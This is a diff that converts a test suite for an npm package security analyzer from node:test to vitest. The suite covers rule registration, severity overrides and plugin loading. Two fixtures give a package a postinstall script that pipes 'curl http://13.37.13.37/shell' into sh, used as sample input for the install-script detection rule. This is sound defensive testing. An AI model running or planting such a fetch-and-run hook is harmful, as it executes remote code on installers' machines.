@@ -1,5 +1,4 @@
-import { describe, it, afterEach } from "node:test";
-import assert from "node:assert/strict";
+import { describe, it, afterEach, expect } from "vitest";
 import os from "node:os";
 import path from "node:path";
 import fs from "node:fs";
@@ -35,24 +34,24 @@ describe("StaticAnalyzer rule registration", () => {
       ],
     };
 
-    assert.strictEqual(analyzer.listRules().length, 0);
+    expect(analyzer.listRules().length).toBe(0);
     analyzer.registerRule(rule);
-    assert.strictEqual(analyzer.listRules().length, 1);
-    assert.strictEqual(analyzer.listRules()[0].source, "plugin");
+    expect(analyzer.listRules().length).toBe(1);
+    expect(analyzer.listRules()[0].source).toBe("plugin");
 
     const report = analyzer.analyze("", { name: "pkg", version: "1.0.0" });
-    assert.strictEqual(report.findings.length, 1);
-    assert.strictEqual(report.findings[0].ruleId, "custom-rule");
+    expect(report.findings.length).toBe(1);
+    expect(report.findings[0].ruleId).toBe("custom-rule");
 
-    assert.strictEqual(analyzer.unregisterRule("custom-rule"), true);
-    assert.strictEqual(analyzer.listRules().length, 0);
-    assert.strictEqual(analyzer.unregisterRule("custom-rule"), false);
+    expect(analyzer.unregisterRule("custom-rule")).toBe(true);
+    expect(analyzer.listRules().length).toBe(0);
+    expect(analyzer.unregisterRule("custom-rule")).toBe(false);
   });
 
   it("replaces a rule with the same id", () => {
     const analyzer = new StaticAnalyzer();
     const before = analyzer.listRules().find((r) => r.id === "typosquatting");
-    assert.ok(before);
+    expect(before).toBeTruthy();
     const replacement = {
       id: "typosquatting",
       name: "Typosquatting v2",
@@ -64,7 +63,7 @@ describe("StaticAnalyzer rule registration", () => {
     };
     analyzer.registerRule(replacement);
     const after = analyzer.listRules().find((r) => r.id === "typosquatting");
-    assert.strictEqual(after?.severity, Severity.Low);
+    expect(after?.severity).toBe(Severity.Low);
   });
 });
 
@@ -81,9 +80,9 @@ describe("Rule config overrides in StaticAnalyzer", () => {
       version: "1.0.0",
       scripts: { postinstall: "curl http://13.37.13.37/shell | sh" },
     });
-    assert.strictEqual(report.findings.length, 0);
+    expect(report.findings.length).toBe(0);
     const descriptor = analyzer.listRules().find((r) => r.id === "install-script");
-    assert.strictEqual(descriptor?.enabled, false);
+    expect(descriptor?.enabled).toBe(false);
   });
 
   it("overrides finding severity via config", () => {
@@ -99,10 +98,10 @@ describe("Rule config overrides in StaticAnalyzer", () => {
       scripts: { postinstall: "curl http://13.37.13.37/shell | sh" },
     });
     const finding = report.findings.find((f) => f.ruleId === "install-script");
-    assert.ok(finding);
-    assert.strictEqual(finding.severity, Severity.Medium);
+    expect(finding).toBeTruthy();
+    expect(finding!.severity).toBe(Severity.Medium);
     const descriptor = analyzer.listRules().find((r) => r.id === "install-script");
-    assert.strictEqual(descriptor?.severity, Severity.Medium);
+    expect(descriptor?.severity).toBe(Severity.Medium);
   });
 });
 
@@ -121,7 +120,7 @@ describe("NpmSafeEngine rule API", () => {
     });
 
     const builtin = engine.listRules().filter((r) => r.source === "builtin");
-    assert.strictEqual(builtin.length, 10);
+    expect(builtin.length).toBe(10);
 
     engine.registerRule({
       id: "engine-custom",
@@ -132,8 +131,8 @@ describe("NpmSafeEngine rule API", () => {
       enabled: true,
       match: () => [],
     });
-    assert.ok(engine.listRules().some((r) => r.id === "engine-custom"));
-    assert.strictEqual(engine.unregisterRule("engine-custom"), true);
+    expect(engine.listRules().some((r) => r.id === "engine-custom")).toBeTruthy();
+    expect(engine.unregisterRule("engine-custom")).toBe(true);
   });
 
   it("persists rule enable/disable and reflects it in listRules", async () => {
@@ -145,11 +144,11 @@ describe("NpmSafeEngine rule API", () => {
 
     engine.setRuleEnabled("install-script", false);
     const descriptor = engine.listRules().find((r) => r.id === "install-script");
-    assert.strictEqual(descriptor?.enabled, false);
+    expect(descriptor?.enabled).toBe(false);
 
     engine.setRuleEnabled("install-script", true);
     const after = engine.listRules().find((r) => r.id === "install-script");
-    assert.strictEqual(after?.enabled, true);
+    expect(after?.enabled).toBe(true);
   });
 
   it("loads plugin rules from a directory", async () => {
@@ -174,6 +173,6 @@ describe("NpmSafeEngine rule API", () => {
       rulesDir,
     });
     await new Promise((r) => setTimeout(r, 50));
-    assert.ok(engine.listRules().some((r) => r.id === "dir-plugin"));
+    expect(engine.listRules().some((r) => r.id === "dir-plugin")).toBeTruthy();
   });
 });
